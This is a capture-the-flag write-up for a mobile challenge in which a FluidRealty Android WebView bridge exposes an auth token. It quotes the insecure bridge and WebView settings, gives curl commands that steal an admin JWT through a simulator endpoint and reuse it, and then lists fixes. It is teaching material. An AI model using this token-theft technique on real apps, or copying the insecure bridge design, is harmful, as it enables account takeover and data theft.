# Challenge - Glass Houses 

- Category: Mobile  
- Difficulty: Medium  

Glass Houses is a medium‑difficulty mobile challenge based on a real‑estate Android app called **FluidRealty**. The app embeds a WebView with a JavaScript bridge named `AndroidBridge` that exposes sensitive data — including the authentication token — to any JavaScript running inside the WebView. The backend provides a `/api/webview/simulate` endpoint that mimics this WebView environment, letting us execute JavaScript that calls `AndroidBridge.getAuthToken()` remotely, steal an admin JWT, and then use it against the API.

---

## 1. Challenge Overview

The provided encrypted ZIP (`public.zip`, password `infected`) contains decompiled Android sources:

- `AndroidManifest.xml`
- `com/fluidrealty/app/MainActivity.java`
- `com/fluidrealty/app/WebViewActivity.java`
- `com/fluidrealty/app/auth/TokenManager.java`
- `com/fluidrealty/app/bridge/AndroidBridge.java`
- `com/fluidrealty/app/network/ApiClient.java`
- `com/fluidrealty/app/network/ApiService.java`
- `res/xml/network_security_config.xml`

A quick probe of the API root reveals the main endpoints:

- `GET /api/properties` — public property listings.
- `GET /api/properties/admin` — classified listings, requires `Authorization: Bearer <token>`.
- `POST /api/deeplink/process` — deep link handler for `fluidrealty://` URIs.
- `POST /api/webview/simulate` — simulates the Android WebView + JavaScript bridge.

From the code, we learn:

- `AndroidBridge.getAuthToken()` returns the current session token (JWT).
- `WebViewActivity` always attaches `AndroidBridge` to the WebView and enables JavaScript.
- `ApiService` uses the auth token as Bearer for `/api/properties/admin`.

The challenge name “Glass Houses” reflects how the WebView’s internals — including auth tokens — are effectively visible to anyone who can run JavaScript inside it.

---

## 2. Vulnerable Design: AndroidBridge and WebView

### 2.1 AndroidBridge.java — Exposed Authentication Methods

The bridge object is injected into the WebView as `AndroidBridge`, with methods callable from JavaScript:

```java
public class AndroidBridge {
    @JavascriptInterface
    public String getAuthToken() {
        return TokenManager.getInstance(context).getCurrentToken();
    }

    @JavascriptInterface
    public String getDeviceId() {
        return ANDROID_ID;
    }

    @JavascriptInterface
    public String getAppVersion() {
        return BuildConfig.VERSION_NAME;
    }

    @JavascriptInterface
    public void showToast(String message) { ... }

    @JavascriptInterface
    public void logEvent(String eventName, String eventData) { ... }
}
```

Critical point: `getAuthToken()` returns the raw authentication token obtained from `TokenManager` and stored (unencrypted) in `SharedPreferences`. Any JavaScript loaded in the WebView can simply call `AndroidBridge.getAuthToken()` and exfiltrate this token.

### 2.2 WebViewActivity.java — Overly Permissive WebView

The WebView is configured with dangerous settings:

```java
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);
settings.setAllowFileAccess(true);
settings.setAllowContentAccess(true);
settings.setAllowUniversalAccessFromFileURLs(true);
settings.setAllowFileAccessFromFileURLs(true);
settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

// Expose the bridge to all JS
webView.addJavascriptInterface(new AndroidBridge(this), "AndroidBridge");

webView.getSettings().setUserAgentString("FluidRealty/3.7.2 Android WebView");
```

Highlights:

- JavaScript is enabled unconditionally.
- File access and universal access from `file://` URLs are allowed, expanding the injection surface.
- Mixed content (HTTP on HTTPS) is permitted.
- `AndroidBridge` is always attached, regardless of which URL the WebView loads.

In a real app, this would allow:

- Untrusted remote pages loaded into the WebView to grab auth tokens.
- Deep links that load attacker‑controlled content to steal tokens via injected JavaScript.

---

## 3. Attack Plan

The backend exposes exactly the environment we need via `/api/webview/simulate`:

- It simulates the Android WebView with the same user agent (`FluidRealty/3.7.2 Android WebView`).
- It attaches an `AndroidBridge` object that behaves like the real app’s bridge.
- It accepts a JSON body with a `javascript` field and evaluates it as if inside the WebView.

Given this, the attack chain is:

1. Call `/api/webview/simulate` with JavaScript `AndroidBridge.getAuthToken()` to retrieve the current auth token.
2. Use the returned token as a Bearer JWT in `Authorization: Bearer <token>` for `/api/properties/admin`.
3. Read the classified listings response, which includes the flag.

No need to reverse the JWT or guess secrets: the app itself is handing us the token via the bridge.

---

## 4. Exploit Script

Here is the minimal script I used to exploit the challenge:

```bash
HOST='TuHost'

curl -sk -X POST "$HOST/api/webview/simulate" \
  -H 'Content-Type: application/json' \
  -H 'X-App-Version: 3.7.2' \
  -H 'X-Platform: android' \
  -H 'User-Agent: FluidRealty/3.7.2 Android WebView' \
  -d '{"javascript":"AndroidBridge.getAuthToken()"}' | jq
```

Explanation:

- `HOST` is the challenge base URL.
- We send a `POST` to `/api/webview/simulate`.
- Headers mimic the mobile app:
  - `X-App-Version: 3.7.2`
  - `X-Platform: android`
  - `User-Agent: FluidRealty/3.7.2 Android WebView`
- Body: `{"javascript":"AndroidBridge.getAuthToken()"}`

The simulator executes this JavaScript in a context where `AndroidBridge` is available, so the result is the same as running:

```js
AndroidBridge.getAuthToken();
```

inside the WebView of the actual app. The response includes something like:

```json
{
  "result": "<JWT_TOKEN_STRING>"
}
```

Once we have that token, the second step (not in the script, but trivial to do) is:

```bash
curl -sk "$HOST/api/properties/admin" \
  -H "Authorization: Bearer <JWT_TOKEN_STRING>" | jq
```

This returns the classified property listings and the flag.

---

## 5. End‑to‑End Flow

Conceptually, the attack flow is:

1. **Analyze decompiled sources**:
   - See that `AndroidBridge` exposes `getAuthToken()` via `@JavascriptInterface`.
   - Confirm WebView always attaches `AndroidBridge`.

2. **Enumerate API on the server**:
   - Discover `/api/webview/simulate`.
   - Confirm `/api/properties/admin` requires a Bearer token.

3. **Exploit WebView simulation**:
   - POST JavaScript `AndroidBridge.getAuthToken()` to `/api/webview/simulate`.
   - Read the returned JWT from the `result` field.

4. **Use stolen token**:
   - Send `Authorization: Bearer <JWT>` to `/api/properties/admin`.
   - Receive classified listings and the flag.

The entire exploit chain fits into just a couple of `curl` commands.

---

## 6. Vulnerability Analysis and Remediation

### 6.1 What Went Wrong

- **Sensitive data exposed via JavaScript bridge**:
  - `getAuthToken()` returns the session token directly to JavaScript, making it easy for any script to steal it.
- **Bridge attached to all content**:
  - No origin checks: `AndroidBridge` is available on any page the WebView loads, including potentially untrusted URLs.
- **Overly permissive WebView config**:
  - Mixed content and universal file access further widen the attack surface.
- **Plaintext token storage**:
  - Token stored in `SharedPreferences` without encryption or hardware‑backed keystore.

### 6.2 Fixes

- Remove `getAuthToken()` from the JavaScript interface; do not expose auth tokens to WebView JS at all.
- Attach `AndroidBridge` only on trusted, first‑party origins (after validating the URL).
- Restrict WebView settings:
  - Disable `setAllowUniversalAccessFromFileURLs` and `setAllowFileAccessFromFileURLs`.
  - Use a strict mixed‑content mode.
- Use secure storage for tokens (e.g., Android Keystore or encrypted preferences).
- Avoid server‑side simulation endpoints that replicate insecure client environments with real tokens.

---

## 7. Summary

Glass Houses demonstrates how dangerous it is to expose authentication tokens through a JavaScript bridge in an Android WebView:

- The app’s `AndroidBridge.getAuthToken()` gives any JavaScript full access to the session token.
- The server conveniently provides a WebView simulator endpoint, so we don’t even need the APK or a device.
- A single `POST` with JavaScript `AndroidBridge.getAuthToken()` yields an admin JWT.
- Using that token against `/api/properties/admin` immediately reveals the classified listings and the flag.

